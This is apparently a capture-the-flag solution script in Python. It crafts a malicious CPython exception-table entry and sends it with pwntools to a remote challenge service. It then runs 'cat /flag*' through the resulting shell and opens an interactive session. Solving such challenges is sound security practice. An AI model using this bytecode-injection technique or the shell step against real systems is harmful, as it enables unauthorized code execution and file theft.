def gen_table(start_offset, size, handler, level, lasti):
    def encode(val):
        if val == 0:
            return b"\0"
        
        chunks = []
        while val:
            chunks.append(val & 63)
            val >>= 6
        
        chunks.reverse()
        
        result = []
        for i, chunk in enumerate(chunks):
            if i < len(chunks) - 1:
                result.append(chunk | 64)
            else:
                result.append(chunk)
        
        return bytes(result)

    result = bytearray(b"".join(map(encode, [start_offset // 2, size, handler // 2, (level << 1) | (lasti & 1)])))
    result[0] |= 0x80
    assert not any(v & 0x80 for v in result[1:])
    return bytes(result)

exc_handler = gen_table(108, 20, 34, 0, 0)

from pwn import *

p = remote("exception-handler-easy.challs.infobahnc.tf", 1337)

p.sendlineafter(b"> ", exc_handler.hex().encode())
p.sendline(b"cat /flag*")

p.interactive()